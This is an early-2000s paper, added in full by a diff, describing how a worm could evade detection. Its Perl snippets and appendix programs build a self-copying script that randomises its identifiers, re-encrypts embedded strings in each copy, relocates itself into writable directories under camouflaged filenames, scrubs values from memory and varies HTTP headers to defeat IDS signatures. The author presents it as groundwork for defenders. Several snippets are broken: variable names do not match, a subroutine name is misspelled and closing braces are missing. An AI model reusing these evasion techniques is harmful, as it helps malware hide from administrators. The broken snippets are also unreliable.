@@ -1,0 +1,867 @@
+
+ TECHNIQUES A WORM MIGHT USE TO BE HARDER TO LOCATE.
+
+        Written by One Semicolon
+        me@onesemicolon.cjb.net
+        http://onesemicolon.cjb.net
+        February 22, 2002
+
+
+- [1] - Introduction - why and what
+        A little while back we had a wave of worms. During the wave there
+ were a lot of people writing about infection rates. Code Red for example
+ quickly ballooned in size and infected a great amount of people in a
+ relatively short period of time. There were ideas on how to infect more
+ computers in shorter amounts of time but no one had ideas on how to hide
+ the activities of the worms.
+ Shortly after a worm appears to have an impact a lot of quickly programmed
+ cleaners are created for the "worm du jour". Even though they are two minute
+ creations they work surprisingly well.
+ Worms have changed very little compared to the first worm years and years
+ ago. They have changed very little because there was no need to. Recently
+ a lot more attention was given to worms and because of that there is more
+ awareness. Awareness means that writers of worms will need to do a better
+ job at making their code stay hidden from the sight of administrators.
+ I believe it is a good idea to philosophize about what may be ahead so we
+ can have the antidote ready for anything that may come up. Perhaps if a lot
+ of people are prepared for any worm that comes up, worms will not be as
+ interesting as they were once before.
+ This paper will discuss different things a worm might do in the future.
+ Snippets of code are included. These snippets are written in Perl.
+ Even if you do not program in Perl, this paper might be interesting just for
+ the ideas that it has.
+ The snippets of code are explained in such a way that even a person new to
+ Perl will be able to understand it. My apologies if that frustrates some of
+ the more knowledgeable people among us.
+
+
+
+- [2.1] - The shape of the code - Introduction
+        The trouble is that when viewing a Perl file one can see the code and
+ usually figure out what the code does. Another problem is that a static
+ script or binary are easy to find. In this chapter I'd like to go over some
+ ways to make the code harder to read and at the same time "irregular". Every
+ instance of the code or infection of a computer should be different.
+ An example program tying everything in this chapter together is in appendix
+ A.1.
+
+
+- [2.2] - The shape of the code - Making it work
+        To change the code we need to create a new instance of it to work
+ with.
+
+  1  : open (SELF, "<$0");
+  2  : @self = <SELF>;
+
+ This right away shows our issue: It is crystal clear what is happening. The
+ variable and file handle make sense. So we need something to replace them
+ with. What we should create is a simple random variable generator.
+
+  1  : $randomlength = int(rand(4));
+  2  : $randomlength += 5;
+  3  : for ($variable = 0; $variable <= $randomlength; $variable++) {
+  4  :   $randomchar = int(rand(26));
+  5  :   $randomchar += 97;
+  6  :   $randomvariable .= chr($randomchar);
+  7  : }
+  8  : print "$randomvariable\n";
+
+ This snippet first creates a random number between 5 and 9 for the length of
+ the variable this creates. Then it goes on to create a variable name from
+ all the letters in the alphabet and prints the result out.
+ Perl does not care how many spaces there are in the script so we can add
+ random extra spacing as well.
+
+  1  : open (SELF, "<$0");
+  2  : @self = <SELF>;
+  3  : open (NEXT, ">$ARGV[0]");
+  4  : foreach $line (@self) {
+  5  :   $coin = int(rand(3));
+  6  :   if ($dice == 0) { $line =~ s/ / /g; }
+  7  :   if ($dice == 1) { $line =~ s/ /  /g; }
+  8  :   $line =~ s/                                  /  /g;
+  9  :   print NEXT $line;
+  10 : }
+  11 : close (NEXT);
+
+ Here is a quick solution to get random spacing on a per line basis.
+ In A.1 you will see code that when run changes all names of variables, subs,
+ file handles, etc. and outputs itself to a random file name in the directory
+ it is run in. The major addition to the code in the appendix is that it
+ shows how to change the names of everything reliably so when the file that
+ is put out is run, it will work as well.
+ When reading this, the resulting obfuscation may not sound like much, but
+ wait until you actually see the result after running the code once before
+ giving your opinion. You will see that it is highly effective.
+ The example in the appendix has strings in it that a hard drive could be
+ searched for. These are just there so you can read what is going on.
+
+
+
+- [3.1] - Hiding hard coded information - Introduction
+        Sometimes a worm has to have information in it that cannot be changed
+ for example, a worm may want to try to flood www.microsoft.com. Putting
+ www.microsoft.com in your code is going to make obvious that whatever the
+ code does, it does at least *something* with www.microsoft.com.
+ Another problem is that the worm could easily be locating by searching the
+ hard drive for a string that is relatively unique to the worm. In this
+ chapter I will write about a simple way to hide information.
+
+
+- [3.2] - Hiding hard coded information - Making it work
+        A worm that needs to hide information has no need for very good
+ encryption as the way to decrypt the information would be located in the
+ same file. A solution to hiding files would be a form of a Caesarean
+ encryption. An example of that would be ROT13 encryption where each letter
+ is replaced with a letter thirteen characters down in the alphabet. The
+ following table illustrates this.
+
+             [letters]
+ [ alphabet ][ a b c d e f g h i j k l m n o p q r s t u v w x y z ]
+ [ ROT13    ][ n o p q r s t u v w x y z a b c d e f g h i j k l m ]
+
+ ROT13 encryption only rotates letters. It does not take care of digits nor
+ punctuation. If someone would want to hide an email address it would not be
+ hidden properly.
+ me@onesemicolon.cjb.net would turn into zr@barfrzvpbyba.pwo.arg. We can see
+ this is an email address because the "@" is still visible as are the dots.
+ Another problem with using the same encryption for every instance is that it
+ creates excellent strings to search a hard drive for.
+ To solve that, a worm would need to have encryption that changes for every
+ instance of itself. A simple way of achieving this is to have a variable
+ containing an amount of "rotations" to be performed on a to be encoded or
+ decoded item. One rotation would be one transposition of characters. In the
+ following example we see how a value can easily be encoded and decoded.
+
+  1  : $code = "me\@onesemicolon.cjb.net";
+  2  : $rotate = 341251;
+  3  :
+  4  : print "to encode - $code\n";
+  5  : $encrypted = &encrypt($code);
+  6  : print "encrypted - $encrypted\n";
+  7  : $decrypted = &decrypted($encrypted);
+  8  : print "decrypted - $decrypted\n";
+  9  :
+  10 : sub encrypt {
+  11 :   my ($toencrypt) = @_;
+  12 :   for ($rotcount = 0; $rotcount <= $rotate; $rotcount++) {
+  13 :      $toencrypt =~ tr/a-z@A-Z.0-9/0-9.@A-Za-z/;
+  14 :   }
+  15 :   return $toencrypt;
+  16 : }
+  17 :
+  18 : sub decrypt {
+  19 :   my ($todecrypt) = @_;
+  20 :   for ($rotcount = 0; $rotcount <= $rotate; $rotcount++) {
+  21 :      $todecrypt =~ tr/0-9.@A-Za-z/a-z@A-Z.0-9/;
+  22 : }
+
+ When run we can see the line that will be worked with. Then we see the
+ string after letting it go through our mangler 341251 times. Then we have it
+ decrypted again. Right now the decryption and encryption code are in their
+ own subroutines. That way they can be called as needed.
+ If the amount of iterations per instance of the code is to be different a
+ piece of code would be needed to replace the amount of rotations. Because
+ this is a number and not a string we cannot place it in @switchthese (see
+ A.1). At the moment there is only one number that needs replacing. In the
+ following example we see a simple subroutine that replaces a number.
+
+  1  : $rotate = 34125;
+  2  : $rotreplace = int(rand(500000));
+  3  : open (SELF, "<$0");
+  4  : @self = <SELF>;
+  5  : close (SELF);
+  6  : foreach $line (@self) {
+  7  :   if ($line =~ /$rotate/) {
+  8  :      $line = '$rotate = ' . "$rotreplace;\n";
+  9  :   }
+  10 :   print $line;
+  11 : }
+
+ To get the most out of this idea, anything hard coded would be mangled up.
+
+ In appendix A.2 you will see an example that does everything that A.1 does
+ but also decodes and encrypts an array every instance of the code run. It
+ has a number of rotations that changes as well every time the code is run.
+ You will want to give line 37 special attention because there is a slight
+ issue you have to think of. When a Perl program works with a string with a
+ @ in it, sometimes it will think it is accessing an array. To prevent that,
+ a backslash is needed. Line 37 has a solution for that issue and is fit
+ right into the portion of the code where the lines for the next instance of
+ the code is being prepared.
+
+
+
+- [4.1] - Roaming - Introduction
+        It is now clear that code can easily be manipulated so it is harder
+ to read and different for every instance of it. In this chapter I'd like to
+ offer a few examples showing how a worm could potentially hide itself in a
+ file system. First by "relocating" the code into an entirely different
+ directory and secondly by adapting the filename to the other files in the
+ directory the code moves to.
+
+
+- [4.2] - Roaming - Relocating
+        When one wants to hide the code in the file system, that person may
+ want to make it as random as possible. The code snippet below goes down a
+ random amount of directories and then works it's way up a random amount of
+ directories again. A lot of potential targets of a worm are computers that
+ would work with permissions and as thus the attack vector may not give
+ complete control over the system. In those instances it is important to put
+ the relocation portion of the code within a do loop that makes sure that the
+ new target is actually writable (see line 3 and 17).
+
+  1  : $traverse = "../" x int(rand(15));
+  2  : 
+  3  : do {
+  4  :         for ($tracount = 0; $tracount <= int(rand(15)); $tracount++) {
+  5  :                 @listing = <$traverse*>;
+  6  :         
+  7  :                 $dircount = 0; foreach $entry (@listing) {
+  8  :                    if (-d ("$traverse" . "$entry")) {
+  9  :                      $directory[$dircount] = "$traverse" . "$entry/";
+  10 :                      $dircount++;
+  11 :                    }
+  12 :                 } $dircount--;
+  13 :         
+  14 :                 $choose = int(rand(@directory));
+  15 :                 $traverse = $directory[$choose] if defined $directory[$choose];
+  16 :         }
+  17 : } until (-w $traverse);
+  18 : 
+  19 : open (SELF, "<$0");
+  20 : @self = <SELF>;
+  21 : close (SELF);
+  22 : open (NEW, ">$traverse$0");
+  23 : print NEW @self;
+  24 : close (NEW);
+  25 : print "Moved to $traverse$0\n";
+
+
+- [4.3] - Roaming - Adapting
+        Once a worm relocates itself to the /home/someuser for example, it
+ will be rather obvious if the file is named dev[1-500] as was done in A.1
+ and A.2. If a worm were to move itself around in the file system, it would
+ most likely adapt itself to the other files in the directory.
+ A bad solution would involve some kind of default name to revert to: In that
+ case the worm is easy to find in virtually any operating system. When
+ adapting a file name it is good to consider what parts of the file system
+ the file would most likely relocate to. What if the worm is limited to files
+ in a ftp folder with tar.gz'd files? Or .c's? Or directories with a lot of
+ different versions of one file?
+ The following snippet of code opens the directory it is run in and takes a
+ random file. It cuts off any extensions like .pl, .txt, etc. if present and
+ then puts a random number and .tar.gz behind the file name.
+
+  1  : @dirlisting = <*>;
+  2  : 
+  3  : $entrylength = @dirlisting;
+  4  : $luckyfile = int(rand($entrylength));
+  5  : $file = $dirlisting[$luckyfile];
+  6  : $rand = int(rand(2));
+  7  : 
+  8  : until ($file !~ /\./) { ($file, $junk) = split (/\./, $file); }
+  9  : $file = "$file$rand.tar.gz";
+  10 : print $file;
+
+ We can see that a number is added to the file name in this example. The
+ reason a number should be added, or some other kind of change is to be made,
+ is illustrated by the following example.
+ Say
+
+  $luckyfile = "someprogram.tar.gz";
+
+ and there were no lines in the code taking care of $rand. Then
+ someprogram.tar.gz would revert to someprogram because of the until loop and
+ then get .tar.gz again, meaning someprogram.tar.gz would either be
+ overwritten or the worm would be unable to replicate.
+ In A.3 you will see an example that incorporates everything in this chapter
+ with the other chapters. The add spacing code has been removed from this
+ example to keep the code from being too repetitive.
+
+
+
+- [5.1] - Memory management - Introduction
+        In this chapter I would like to quickly cover cleaning out the memory
+ from values that can be recognized by someone as being related to a specific
+ worm. Many programs work with data that is only needed temporarily and can
+ then be freed up/undefined to release memory for usage. The same goes
+ counts for worms. In the future we may encounter worms that make sure no
+ values that can indicate they are around stay in memory.
+
+
+- [5.2] - Memory management - How it works
+ In chapter 3 a easy way to hide hard coded values was shown. At one
+ point the decoded value was assigned to memory. Hiding hard coded values
+ will be useless to a worm writer if the values can be taken from memory.
+ That is why we might see constructs like the following in the future.
+
+  1  : $code = "Coded.by.One.Semicolon";
+  2  : print "normal  - $code\n";
+  3  : $code = &clean("code");
+  4  : print "cleaned - $code\n";
+  5  : undef ($code);
+  6  : 
+  7  : sub clean {
+  8  :         my ($toclean) = @_;
+  9  :         $clnlength = length(${$toclean});
+  10 :         for ($clncount = 0; $clncount < $clnlength; $clncount++) {
+  11 :            $replacement .= chr(int(rand(256)));
+  12 :         }
+  13 :         ${$toclean} = $replacement;
+  14 : }
+
+ $code has the decoded value and just the name of the variable is passed to
+ the subroutine. The subroutine receives the name of the variable to work
+ with and finds out how long it is. Then a replacement string is generated
+ and then assigned.
+ This leaves the following waste:
+ $toclean (name of the variable), $clnlength (length of the variable) and the
+ replacement string appears in two locations ($code, $replacement).
+
+ In A.4 you will find a slightly larger example of this, although replacing
+ one value with another is very straightforward. 
+
+
+
+- [6.1] - Acting Normal - Introduction
+        When Code Red was infecting the internet, anyone with a HTTP server
+ was getting logs full of computers that were clearly infected. Up to a point
+ a HTTP request to a random IP address can be hidden: you will always have to
+ try and make a connection the port involved. Verifying if a computer is
+ vulnerable will certainly be made far more discrete when a open port has
+ been found.
+ Worm writers have to make their code work on as many computers as
+ possible, to be as effective as possible. Because of that, programming code
+ would be written with basic API's, modules or whatever may be required.
+ There is no sense to write code to include a function that is only available
+ on a small percentage of vulnerable computers. The only reason a worm writer
+ may choose to do so after all is because it is needed as part of the exploit
+ itself.
+ The last two paragraphs may seem to be very different subjects, but in this
+ chapter they are combined. Using a general Perl module I would like to show
+ a way to make a HTTP GET request look both valid and different every time
+ such a request is made. 
+
+
+- [6.2] - Acting Normal - HTTP
+        In this section I will offer two simple examples how a worm could
+ disguise itself. If a worm searches for computers with a vulnerable HTTP
+ server, one way to make the requests look like something they are not is to
+ make it look like a normal request.
+ Obviously one would say, but it is a bit more complex than it appears. First
+ you have to consider the things a normal browser sends. I set up a simple
+ Perl server on port 8008 to record the request a browser makes. Below is the
+ result I got from Internet Explorer 5.5 when requesting
+ http://localhost:8008. See appendix B.1 for other browsers.
+
+  GET / HTTP/1.1
+  Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+  Accept-Language: en-ca
+  Accept-Encoding: gzip, deflate
+  User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)
+  Host: localhost:8008
+  Connection: Keep-Alive
+
+ There is quite a bit of information that a browser sends out before
+ receiving anything. You can see that the Accept-Language it set to Canada.
+ An interesting thing to notice is that my test setup was running Windows ME
+ and not Windows 98 as claimed in the User-Agent field.
+
+ In the following example IO::Socket is used to make a simple connection and
+ get the main page of a web site. Usage: Perl example.pl www.server.com 80.
+
+  1  : use IO::Socket;
+  2  : 
+  3  : $remote = IO::Socket::INET->new (
+  4  :         PeerAddr => "$ARGV[0]",
+  5  :         PeerPort => "$ARGV[1]",
+  6  :         Proto    => "tcp",
+  7  :         ) || die "trying";
+  8  : 
+  9  : print $remote "GET / HTTP/1.0\n\n";
+  10 : while ( <$remote> ) { print }
+
+ "GET / HTTP/1.0" does not look like a very normal browser request. In the
+ following example a request for a website in the style that Netscape 4.73
+ would make one is duplicated. You will find that the connection stays open
+ because of the "Connection: Keep-Alive" line that Netscape 4.73 sends in a
+ GET request.
+
+  1  : use IO::Socket;
+  2  : 
+  3  : $remote = IO::Socket::INET->new (
+  4  :         PeerAddr => "$ARGV[0]",
+  5  :         PeerPort => "$ARGV[1]",
+  6  :         Proto    => "tcp",
+  7  :         ) || die "trying";
+  8  : 
+  9  : print $remote "GET / HTTP/1.0
+  10 : Connection: Keep-Alive
+  11 : User-Agent: Mozilla/4.73 (Win95; U)
+  12 : Host: $ARGV[0]:$ARGV[1]
+  13 : Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
+  14 : Accept-Encoding: gzip
+  15 : Accept-Language: en
+  16 : Accept-Charset: iso-8859-1,*,utf-8\n\n";
+  17 : 
+  18 : while ( <$remote> ) { print }
+
+ Although the code above does generate a normal looking request you do not
+ have to expect it in any worm code any time soon. If the request is the same
+ for every connection it will just become a different fingerprint left behind
+ and will not add anything useful to the worm. Below is code that shows
+ different ways one request can be altered to look slightly different
+ every time to make it harder to find something that is specific to the worm
+ only.
+  
+  1  : use IO::Socket;
+  2  : 
+  3  : @choices_agent_ver = ( "4.7",  "4.72", "4.73", "4.74",
+  4  :                        "4.75", "4.76", "4.78" );
+  5  : $choices_agent_len = @choices_agent_ver;
+  6  : $choice_agent_nr = int(rand($choices_agent_len));
+  7  : $choice_agent = $choices_agent_ver[$choice_agent_nr];
+  8  : 
+  9  : @accept = ( "image/gif",  "image/x-xbitmap",
+  10 :             "image/jpeg", "image/pjpeg",
+  11 :             "image/png" );
+  12 : $acceptlen = @accept;
+  13 : 
+  14 : for ($cnt = 0; $cnt <= int(rand($acceptlen)); $cnt++) {
+  15 :         $grab = int(rand($nacceptlen));
+  16 :         $acceptstring .= "$accept[$grab], ";
+  17 :         splice (@accept, $grab, 1);
+  18 :         $nacceptlen = @accept;
+  19 : }
+  20 : 
+  21 : $switchencoding = int(rand(2));
+  22 : 
+  23 : $request = "GET / HTTP/1.0
+  24 : Connection: Keep-Alive
+  25 : User-Agent: Mozilla/$choice_agent (Win95; U)
+  26 : Host: $ARGV[0]:$ARGV[1]
+  27 : Accept: $acceptstring*/*
+  28 : ";
+  29 : $request .= "Accept-Encoding: gzip\n" if $switchencoding == 0;
+  30 : $request .= "Accept-Language: en
+  31 : Accept-Charset: iso-8859-1,*,utf-8\n\n";
+  32 : 
+  33 : print $request;
+  34 :
+  35 : $remote = IO::Socket::INET->new (
+  36 :         PeerAddr => "$ARGV[0]",
+  37 :         PeerPort => "$ARGV[1]",
+  38 :         Proto    => "tcp",
+  39 :         ) || die "trying";
+  40 : print $remote "$request";
+  41 : 
+  42 : while ( <$remote> ) { print }
+
+ The code above show cases three methods a request may be changed, yet still
+ be valid and indistinguishable from GET requests other visitors to a site
+ may make.
+
+ 1) In line 3 to 7 a random User-Agent version is chosen and put into the GET
+    request.
+ 2) In line 9 to 12 a random amount of random Accept entries are chosen and
+    put into the GET request.
+ 3) In line 21 a random 0 or 1 is created to decide if the Accept-Encoding
+    entry should be added or not to the GET request.
+
+ Line 23 to 31 puts all of this together into one request to send to the
+ server. The more changes are made, the harder it becomes to come up with a
+ way to recognize something that is unique to the worm. If a worm uses
+ several different browser "footprints" that are all very different, yet are
+ still legitimate, it will be impossible to create a IDS signature for it as
+ it will cause false positives to occur. Consider a normal person using their
+ web browser and their surfing looks like a worm request? The log coming from
+ the IDS system will be useless. By shutting out the worm you shut
+ out normal users and by allowing normal users you are allowing the worm.
+
+
+
+- [7] - Closing
+         This raises an interesting issue: how can you find out if a
+ particular server has been infected or not if after this paper is finished
+ and everything has been implemented? 
+ Right now I don't know of any ways to be completely different every time,
+ but possible only to locate by its brother and sister infections. The one
+ excludes the other, which creates a sliver of hope for anyone hoping to at
+ least retain the capability to locate a worm.
+ The frustrating part is that one can write a worm to be like a suicide
+ bomber. A worm could be made to repetitively infect vulnerable computers
+ creating the effect of having the computers the worms live on collapse under
+ the pressure of the processes and bandwidth involved.
+
+ I would like to add a few things before I let the appendix end this paper.
+ For one, the code in this paper is anything but cut and paste. Anyone
+ with half a brain can figure out that you could search a hard drive for a
+ file with X amount of "int(rand("'s.
+
+ Secondly, The code is offered as an example from which one can jump to
+ create antidotes. The paper is great as a beginning to think up more
+ intricate and better implementations to find a solution for.
+
+ Thirdly, consider taking all I wrote and finding ways around it: think of
+ how there are empty lines between sub routines, how the program is ordered
+ in the way of a normal program. Can the order of the sub routines and the
+ amount of lines they each have give us something to recognize the worm by?
+ This paper gives us something to work with.
+
+ 1;
+
+
+- [A.1] - Appendix - Example program for chapter 2
+  1  : open (SELF, "<$0");
+  2  : @self = <SELF>;
+  3  : close (SELF);
+  4  :
+  5  : @switchthese = ("OUT2FILE",     "SELF",
+  6  :                 "addspacing",   "createsubstitutes",
+  7  :                 "coin",         "counter",      "entry",
+  8  :                 "length",       "line",         "randomchar",
+  9  :                 "randomlen",    "randomvar",    "self",
+  10 :                 "swcounter",    "switchthese",  "variable");
+  11 :
+  12 : &createsubstitutes;
+  13 :
+  14 : $dev = "dev" . int(rand(500));
+  15 : print "Spawned a clone to $dev\n";
+  16 :
+  17 : open (OUT2FILE, ">$dev");
+  18 : foreach $line (@self) {
+  19 :    for ($swcounter = 0; $swcounter <= $length; $swcounter++) {
+  20 :       $line =~ s/$switchthese[$swcounter]/$randomvar[$swcounter]/g;
+  21 :       &addspacing;
+  22 :    }
+  23 :    print OUT2FILE $line;
+  24 : }
+  25 : close (OUT2FILE);
+  26 :
+  27 : sub createsubstitutes {
+  28 :         $length = @switchthese; $length--;
+  29 :         for ($counter = 0; $counter <= $length; $counter++) {
+  30 :            $randomlen = int(rand(4));
+  31 :            $randomlen += 5;
+  32 :            for ($variable = 0; $variable <= $randomlen; $variable++) {
+  33 :               $randomchar = int(rand(26));
+  34 :               $randomchar += 97;
+  35 :               $randomvar[$counter] .= chr($randomchar);
+  36 :            }
+  37 :         }
+  38 : }
+  39 :
+  40 : sub addspacing {
+  41 :         $coin = int(rand(3));
+  42 :         if ($coin == 0) { $line =~ s/ / /g; }
+  43 :         if ($coin == 1) { $line =~ s/ /  /g; }
+  44 :         $line =~ s/                          /  /g;
+  45 : }
+
+
+- [A.2] - Appendix - Example program for chapter 3
+
+  1  : open (SELF, "<$0");
+  2  : @self = <SELF>;
+  3  : close (SELF);
+  4  : 
+  5  : $code[0] = "IAWKJAqAI2aKHKJ8ahk8JAd";
+  6  : $code[1] = "ZK\@A\@8kG8lJA8bAI2aKHKJ";
+  7  : $lenofen = @code;
+  8  : 
+  9  : $rotate = 34125;
+  10 : 
+  11 : $rotreplace = int(rand(500000));
+  12 : 
+  13 : @switchthese = ("OUT2FILE",     "SELF",
+  14 :                 "addspacing",   "createsubstitutes",
+  15 :                 "encrypt",      "decrypt",
+  16 :                 "code",         "coin",         "counter",
+  17 :                 "enccounter",   "entry",        "length",
+  18 :                 "lenofen",      "line",         "randomchar",
+  19 :                 "randomlen",    "randomvar",    "rotate",
+  20 :                 "rotreplace",   "self",         "swcounter",
+  21 :                 "switchthese",  "variable");
+  22 : 
+  23 : &createsubstitutes;
+  24 :
+  25 : $dev = "dev" . int(rand(500));
+  26 : print "Spawned a clone to $dev\n";
+  27 : 
+  28 : open (OUT2FILE, ">$dev");
+  29 : foreach $line (@self) {
+  30 :    if ($line =~ /$rotate/) { $line = '$rotate = ' . "$rotreplace;\n"; }
+  31 :    for ($enccounter = 0; $enccounter <= $lenofen; $enccounter++) {
+  32 :       if ($line =~ /^\$code\[$enccounter\]/) {
+  33 :         $oldc = &decrypt ($code[$enccounter]);
+  34 :         print "$oldc\n";
+  35 :         $newc = &encrypt ($oldc);
+  36 :         $line = '$code[' . "$enccounter] = \"$newc\";\n";
+  37 :         $line =~ s/\@/\\\@/g;
+  38 :         print "$line";
+  39 :       }
+  40 :    }
+  41 :    for ($swcounter = 0; $swcounter <= $length; $swcounter++) {
+  42 :       $line =~ s/$switchthese[$swcounter]/$randomvar[$swcounter]/g;
+  43 :       &addspacing;
+  44 :    }
+  45 :    print OUT2FILE $line;
+  46 : }
+  47 : close (OUT2FILE);
+  48 : 
+  49 : sub createsubstitutes {
+  50 :         $length = @switchthese; $length--;
+  51 :         for ($counter = 0; $counter <= $length; $counter++) {
+  52 :            $randomlen = int(rand(4));
+  53 :            $randomlen += 5;
+  54 :            for ($variable = 0; $variable <= $randomlen; $variable++) {
+  55 :               $randomchar = int(rand(26));
+  56 :               $randomchar += 97;
+  57 :               $randomvar[$counter] .= chr($randomchar);
+  58 :            }
+  59 :         }
+  60 : }
+  61 : 
+  62 : sub addspacing {
+  63 :         $coin = int(rand(3));
+  64 :         if ($coin == 0) { $line =~ s/ / /g; }
+  65 :         if ($coin == 1) { $line =~ s/ /  /g; }
+  66 :         $line =~ s/                          /  /g;
+  67 : 
+  68 : sub encrypt {
+  69 :         my ($toencrypt) = @_;
+  70 :         for ($rotcount = 0; $rotcount <= $rotreplace; $rotcount++) {
+  71 :            $toencrypt =~ tr/a-z@A-Z.0-9/0-9.@A-Za-z/;
+  72 :         }
+  73 :         return $toencrypt;
+  74 : }
+  75 : 
+  76 : sub decrypt {
+  77 :         my ($todecrypt) = @_;
+  78 :         for ($rotcount = 0; $rotcount <= $rotate; $rotcount++) {
+  79 :            $todecrypt =~ tr/0-9.@A-Za-z/a-z@A-Z.0-9/;
+  80 :         }
+  81 :         return $todecrypt;
+  82 : }
+   
+
+- [A.3] - Appendix - Example program chapter 4
+
+  1  : open (SELF, "<$0");
+  2  : @self = <SELF>;
+  3  : close (SELF);
+  4  : 
+  5  : $code[0] = "IAWKJAqAI2aKHKJ8ahk8JAd";
+  6  : $code[1] = "ZK\@A\@8kG8lJA8bAI2aKHKJ";
+  7  : $lenofen = @code;
+  8  : 
+  9  : $rotate = 34125;
+  10 : 
+  11 : $rotreplace = int(rand(500000));
+  12 : 
+  13 : @switchthese = ("OUT2FILE",     "SELF",
+  14 :                 "createsubstitutes",            "encrypt",
+  15 :                 "decrypt",      "newname",
+  16 :                 "choose",       "code",         "coin",         
+  17 :                 "counter",      "dircount",     "directory",
+  18 :                 "dirlist",      "elen",         "enccounter",   
+  19 :                 "entry",        "filename",     "length",
+  20 :                 "lenofen",      "line",         "listing",
+  21 :                 "luckyfile",    "newc",         "oldc",
+  22 :                 "randomadd",    "randomchar",   "randomlen",    
+  23 :                 "randomvar",    "rotate",       "rotcount",
+  24 :                 "rotreplace",   "self",         "swcounter",
+  25 :                 "switchthese",  "todcrypt",     "toecrypt",
+  26 :                 "traverse",     "variable");
+  27 : 
+  28 : &createsubstitutes;
+  29 : &newname;
+  30 : 
+  31 : open (OUT2FILE, ">$filename");
+  32 : foreach $line (@self) {
+  33 :  if ($line =~ /$rotate/) { $line = '$rotate = ' . "$rotreplace;\n"; }
+  34 :  for ($enccounter = 0; $enccounter <= $lenofen; $enccounter++) {
+  35 :       if ($line =~ /^\$code\[$enccounter\]/) {
+  36 :         $oldc = &decrypt ($code[$enccounter]);
+  37 :         print "$oldc\n";
+  38 :         $newc = &encrypt ($oldc);
+  39 :         $line = '$code[' . "$enccounter] = \"$newc\";\n";
+  40 :         $line =~ s/\@/\\\@/g;
+  41 :         print "$line";
+  42 :       }
+  43 :    }
+  44 :    for ($swcounter = 0; $swcounter <= $length; $swcounter++) {
+  45 :       $line =~ s/$switchthese[$swcounter]/$randomvar[$swcounter]/g;
+  46 :    }
+  47 :    print OUT2FILE $line;
+  48 : }
+  49 : close (OUT2FILE);
+  50 : exit;
+  51 : 
+  52 : sub createsubstitutes {
+  53 :     $length = @switchthese; $length--;
+  54 :     for ($counter = 0; $counter <= $length; $counter++) {
+  55 :        $randomlen = int(rand(4));
+  56 :        $randomlen += 5;
+  57 :        for ($variable = 0; $variable <= $randomlen; $variable++) {
+  58 :           $randomchar = int(rand(26));
+  59 :           $randomchar += 97;
+  60 :           $randomvar[$counter] .= chr($randomchar);
+  61 :        }
+  62 :     }
+  63 : }
+  64 :
+  65 : sub decrypt {
+  66 :     my ($todcrypt) = @_;
+  67 :     for ($rotcount = 0; $rotcount <= $rotate; $rotcount++) {
+  68 :        $todcrypt =~ tr/0-9.@A-Za-z/a-z@A-Z.0-9/;
+  69 :     }
+  70 :     return $todcrypt;
+  71 : }
+  72 : 
+  73 : sub encrypt {
+  74 :     my ($toecrypt) = @_;
+  75 :     for ($rotcount = 0; $rotcount <= $rotreplace; $rotcount++) {
+  76 :        $toecrypt =~ tr/a-z@A-Z.0-9/0-9.@A-Za-z/;
+  77 :     }
+  78 :     return $toecrypt;
+  79 : }
+  80 : 
+  81 : sub newname {
+  82 :     $traverse = "../" x int(rand(15));
+  83 :        
+  84 :     do {
+  85 :        for ($tracount = 0; $tracount <= int(rand(15)); $tracount++) {
+  86 :           opendir (DIR, "$traverse");
+  87 :           readdir (DIR); readdir (DIR);
+  88 :           undef (@listing); undef (@directory);
+  89 :           @listing = readdir (DIR);
+  90 :           closedir (DIR);
+  91 :                
+  92 :           $dircount = 0; foreach $entry (@listing) {
+  93 :               if (-d ("$traverse" . "$entry")) {
+  94 :                  $directory[$dircount] = "$traverse" . "$entry/";
+  95 :                  $dircount++;
+  96 :               }
+  97 :           } $dircount--;
+  98 :                
+  99 :           $choose = int(rand(@directory));
+  100:        $traverse = $directory[$choose] if defined $directory[$choose];
+  101:        }
+  102:     } until (-w $traverse);
+  103: 
+  104:     opendir (DIR, "$traverse");
+  105:     readdir (DIR); readdir (DIR);
+  106:     @dirlist = readdir (DIR);
+  107:     closedir (DIR);
+  108:         
+  109:     $elen = @dirlist;
+  110:     $luckyfile = int(rand($elen));
+  111:     $filename = $dirlist[$luckyfile];
+  112:     $randomadd = int(rand(2));
+  113:         
+  114:     until ($filename !~ /\./) {
+  115:        ($filename, $junk) = split (/\./, $filename);
+  116:     }
+  117:     $filename = $traverse . $filename . $randomadd . ".tar.gz";
+  118:     print "Spawning $filename\n";
+  119: }
+
+
+- [A.4] - Appendix - Example program for chapter 6
+
+  1  : $code = "Coded.by.One.Semicolon";
+  2  : $rotate = 34125;
+  3  : 
+  4  : print "to encode - $code\n";
+  5  : $encrypted = &encrypt($code);
+  6  : print "encrypted - $encrypted\n";
+  7  : $decrypted = &decrypt($encrypted);
+  8  : print "decrypted - $decrypted\n";
+  9  : $decrypted = &clean("decrypted");
+  10 : print "cleaned   - $decrypted\n";
+  11 : 
+  12 : sub encrypt {
+  13 :         my ($toencrypt) = @_;
+  14 :         for ($rotcount = 0; $rotcount <= $rotate; $rotcount++) {
+  15 :            $toencrypt =~ tr/a-z@A-Z.0-9/0-9.@A-Za-z/;
+  16 :         }
+  17 :         return $toencrypt;
+  18 : }
+  19 : 
+  20 : sub decrypt {
+  21 :         my ($todecrypt) = @_;
+  22 :         for ($rotcount = 0; $rotcount <= $rotate; $rotcount++) {
+  23 :            $todecrypt =~ tr/0-9.@A-Za-z/a-z@A-Z.0-9/;
+  24 :         }
+  25 :         return $todecrypt;
+  26 : }
+  27 : 
+  28 : sub clean {
+  29 :         my ($toclean) = @_;
+  30 :         $clnlength = length(${$toclean});
+  31 :         for ($clncount = 0; $clncount < $clnlength; $clncount++) {
+  32 :            $replacement .= chr(int(rand(256)));
+  33 :         }
+  34 :         ${$toclean} = $replacement;
+  35 : }
+
+
+
+- [B.1.1] - Browser footprints - Note
+        Some browsers have large Accept, Accept-Charset fields. They have
+ been moved to the next line and are noted by an indent.
+
+
+- [B.1.2] - Browser footprints - Netscape 4.73
+ GET / HTTP/1.0
+ Connection: Keep-Alive
+ User-Agent: Mozilla/4.73 (Win95; U)
+ Host: localhost:8008
+ Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
+ Accept-Encoding: gzip
+ Accept-Language: en
+ Accept-Charset: iso-8859-1,*,utf-8
+
+
+- [B.1.3] - Browser footprints - Netscape 6.1
+ GET / HTTP/1.1
+ Host: localhost:8008
+ User-Agent: Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:0.9.2) 
+	Gecko/20010726 Netscape6/6.1
